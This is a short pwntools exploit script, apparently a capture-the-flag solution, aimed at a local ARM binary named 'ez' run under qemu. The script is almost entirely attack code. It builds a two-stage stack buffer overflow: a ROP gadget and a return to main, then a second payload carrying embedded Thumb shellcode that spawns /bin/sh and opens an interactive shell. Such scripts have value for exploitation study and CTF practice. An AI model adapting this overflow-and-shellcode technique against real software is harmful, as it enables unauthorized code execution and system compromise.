from pwn import *
import time
#r = process(['qemu-arm-static','-g','12345','./ez'])
r = process(['qemu-arm-static','./ez'])
#raw_input("?")

shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"

pop_r3_pc = 0x102f0
bss = 0x21028
main = 0x10421
payload = 'A'*20
payload += p32(bss)
payload += p32(pop_r3_pc)
payload += p32(bss)
payload += p32(main)
r.sendline(payload)
time.sleep(0.5)

payload = 'A'*28
payload += p32(bss+0x20)
payload += shellcode
r.sendline(payload)
r.interactive()